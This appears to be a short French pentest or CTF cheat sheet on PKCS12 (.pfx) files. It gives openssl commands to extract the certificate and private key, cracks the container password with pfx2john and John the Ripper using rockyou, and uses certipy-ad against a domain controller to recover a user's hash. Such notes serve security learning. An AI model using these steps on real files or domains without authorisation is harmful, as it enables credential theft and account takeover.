Un fichier `.pfx` (PKCS12) c'est un conteneur qui embarque un certificat + une clé privée, et il peut être verrouillé par un mot de passe au moment de sa création.

## Extraire le certificat et la clé séparément :

```bash
# Extraire le certificat (.crt)
openssl pkcs12 -in FICHIER.pfx -clcerts -nokeys -out cert.crt -passin pass:MOTDEPASSE

# Extraire la clé privée (.key)
openssl pkcs12 -in FICHIER.pfx -nocerts -nodes -out cert.key -passin pass:MOTDEPASSE

```


## Trouver le mot de passe d'un fichier .pfx

#### Cracker le mot de passe du fichier 
```bash 
pfx2john FIHIER.pfx > FICHIER_pfx.hash
john FICHIER_pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
####  Récupérer le hash du user avec un fichier .pfx et son mot de passe
```bash
certipy-ad auth -pfx 'FICHIER.pfx' -password 'LEMOTDETROUVÉ' -dc-ip <IP-DC>
```
